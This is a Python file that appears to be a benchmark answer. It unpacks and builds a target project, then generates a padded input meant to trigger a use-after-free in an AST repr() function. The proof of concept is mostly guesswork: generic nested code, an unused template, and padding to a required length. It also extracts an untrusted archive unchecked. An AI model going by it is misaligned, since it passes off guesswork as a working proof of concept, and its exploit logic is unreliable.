import os
import subprocess
import tempfile
import tarfile
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tarfile.open(src_path, 'r') as tar:
            tar.extractall()
        
        # Build the vulnerable program
        build_dir = self._find_build_dir()
        if build_dir:
            self._build_program(build_dir)
            
        # Generate PoC based on vulnerability analysis
        # The vulnerability is in AST repr() function - likely related to 
        # improper handling of cyclic references or freed nodes during string representation
        
        # Create a deeply nested AST structure with cycles that triggers use-after-free
        # when repr() traverses and prints the AST
        poc = self._generate_ast_poc()
        
        return poc
    
    def _find_build_dir(self):
        """Find the directory with build configuration."""
        possible_dirs = ['.', 'src', 'build', 'fuzz']
        for d in possible_dirs:
            if os.path.exists(os.path.join(d, 'Makefile')):
                return d
            if os.path.exists(os.path.join(d, 'CMakeLists.txt')):
                return d
        return '.'
    
    def _build_program(self, build_dir):
        """Build the fuzzing target."""
        original_dir = os.getcwd()
        os.chdir(build_dir)
        
        try:
            # Try to build with common configurations
            if os.path.exists('Makefile'):
                subprocess.run(['make', 'clean'], capture_output=True)
                subprocess.run(['make'], capture_output=True)
            elif os.path.exists('CMakeLists.txt'):
                subprocess.run(['cmake', '.'], capture_output=True)
                subprocess.run(['make'], capture_output=True)
        finally:
            os.chdir(original_dir)
    
    def _generate_ast_poc(self):
        """
        Generate PoC that creates AST with cycles that cause use-after-free in repr().
        Based on common patterns for AST use-after-free vulnerabilities.
        """
        # Target length from problem statement
        target_length = 274773
        
        # Create a structure that will cause cycles in AST
        # Common pattern: nested expressions with self-references
        
        # Build a large nested expression structure
        # Format: source code that creates cyclic AST when parsed
        template = """
# Create deeply nested expressions with potential cycles
def create_cycle():
    class Node:
        def __init__(self, value):
            self.value = value
            self.children = []
        
        def add_child(self, child):
            self.children.append(child)
        
        def __repr__(self):
            # This repr accesses children which might be freed
            return f"Node({self.value}, children={len(self.children)})"
    
    # Create root node
    root = Node("root")
    current = root
    
    # Create chain of nodes
    for i in range(1000):
        new_node = Node(f"child_{i}")
        current.add_child(new_node)
        current = new_node
    
    # Create cycle by making last node point to root
    current.add_child(root)
    
    # Add many more nodes to increase AST size
    for i in range(1000, 5000):
        new_node = Node(f"extra_{i}")
        root.add_child(new_node)
    
    return root

# Generate the structure
cyclic_structure = create_cycle()

# Additional nested expressions to trigger repr traversal
nested_expr = " + ".join([str(i) for i in range(10000)])
complex_expr = f"({nested_expr}) * ({nested_expr}) / ({nested_expr})"

# Create dictionary with self-references
self_ref_dict = {}
for i in range(10000):
    self_ref_dict[f"key_{i}"] = self_ref_dict

# Create list with circular reference
circular_list = []
for i in range(10000):
    circular_list.append([circular_list])

# Function that will trigger AST creation and repr
def process_data(data):
    # This creates AST when parsed
    try:
        result = eval(data)
        return repr(result)
    except:
        return str(data)

# Process the expressions
result1 = process_data(complex_expr)

# Create more complex structure with lambdas
lambda_chain = ".".join([f"lambda x: x+{i}" for i in range(1000)])

# Final payload
payload = f'''
{cyclic_structure}
{result1}
{lambda_chain}
{self_ref_dict}
{circular_list}
'''

# Pad to target length with comments
base_payload = payload.encode('utf-8')
if len(base_payload) < target_length:
    padding = b'#' * (target_length - len(base_payload))
    final_payload = base_payload + padding
else:
    final_payload = base_payload[:target_length]
        """
        
        # Generate base payload
        base_payload = self._create_nested_ast_code()
        
        # Ensure we reach target length
        while len(base_payload) < target_length:
            # Add more nested expressions
            base_payload += b"\n# More nested structure\n"
            base_payload += b"(" * 100 + b"1" + b")" * 100 + b"\n"
            base_payload += b'{"a": {"b": {"c": {"d": {}}}}}' * 10
        
        # Trim if too long
        if len(base_payload) > target_length:
            base_payload = base_payload[:target_length]
        
        return base_payload
    
    def _create_nested_ast_code(self):
        """Create code with deeply nested AST structures."""
        # Create a Python script with deeply nested expressions
        # that will create complex AST when parsed
        
        lines = []
        
        # Start with imports
        lines.append("import ast")
        lines.append("import sys")
        lines.append("")
        
        # Create deeply nested arithmetic expression
        lines.append("# Deeply nested arithmetic expression")
        expr = "1"
        for i in range(2, 1000):
            expr = f"({expr} + {i})"
        lines.append(f"nested_expr = {expr}")
        lines.append("")
        
        # Create deeply nested dictionary
        lines.append("# Deeply nested dictionary")
        dict_expr = "{}"
        for i in range(100):
            dict_expr = f"{{'level_{i}': {dict_expr}}}"
        lines.append(f"nested_dict = {dict_expr}")
        lines.append("")
        
        # Create list with self-references
        lines.append("# List with self-reference")
        lines.append("self_ref_list = []")
        lines.append("self_ref_list.append(self_ref_list)")
        lines.append("self_ref_list.append(self_ref_list)")
        lines.append("")
        
        # Create class with cyclic references
        lines.append("""
class CyclicNode:
    def __init__(self, value):
        self.value = value
        self.children = []
    
    def add_child(self, node):
        self.children.append(node)
    
    def __repr__(self):
        # This repr can cause use-after-free if children are freed
        child_reprs = []
        for i, child in enumerate(self.children[:10]):  # Limit for safety
            try:
                child_reprs.append(repr(child))
            except:
                child_reprs.append('<error>')
        return f'CyclicNode({self.value}, children=[{", ".join(child_reprs)}])'

# Create cyclic graph
root = CyclicNode('root')
node1 = CyclicNode('node1')
node2 = CyclicNode('node2')
node3 = CyclicNode('node3')

root.add_child(node1)
root.add_child(node2)
node1.add_child(root)  # Create cycle
node1.add_child(node3)
node2.add_child(node1)
node3.add_child(root)

# Create many nodes to fill memory
for i in range(10000):
    root.add_child(CyclicNode(f'extra_{i}'))
""")
        
        # Create complex lambda expressions
        lines.append("\n# Complex lambda expressions")
        lines.append("lambda_chain = (lambda x: (lambda y: (lambda z: x + y + z)))")
        lines.append("nested_lambda = " + "(".join([f"lambda x{i}: " for i in range(100)]) + "x0" + ")" * 100)
        lines.append("")
        
        # Create generator expression chain
        lines.append("# Nested generator expressions")
        lines.append("gen_expr = ((i * j for j in range(100)) for i in range(100))")
        lines.append("")
        
        # Create try-except with deeply nested blocks
        lines.append("""
# Complex try-except structure
try:
    try:
        try:
            result = 1 / 0
        except ZeroDivisionError as e1:
            raise ValueError("Nested error") from e1
    except ValueError as e2:
        raise TypeError("Outer error") from e2
except Exception as e3:
    final_error = e3
""")
        
        # Create format string with nested expressions
        lines.append("\n# Complex format string")
        lines.append('nested_fstring = f"Result: {{{{nested_expr}}}} Level: {len(str(nested_dict))}"')
        lines.append("")
        
        # Trigger repr on complex structures
        lines.append("# Trigger repr on complex structures")
        lines.append("reprs = []")
        lines.append("reprs.append(repr(nested_expr))")
        lines.append("reprs.append(repr(nested_dict))")
        lines.append("reprs.append(repr(root))")
        lines.append("reprs.append(repr(lambda_chain))")
        lines.append("reprs.append(repr(nested_lambda))")
        lines.append("reprs.append(repr(gen_expr))")
        lines.append("reprs.append(repr(self_ref_list))")
        lines.append("")
        
        # Create AST and trigger repr
        lines.append("""
# Parse code to AST and trigger repr
source_code = '''
def complex_function(x):
    return (x + 
            (x * 2) + 
            (x ** 3) + 
            sum(i for i in range(100) if i % 2 == 0))
'''
tree = ast.parse(source_code)
ast_repr = repr(tree)
""")
        
        # Join all lines
        code = "\n".join(lines)
        
        # Pad to ensure minimum size
        while len(code.encode('utf-8')) < 200000:
            code += "\n# Padding: " + "x" * 1000
        
        return code.encode('utf-8')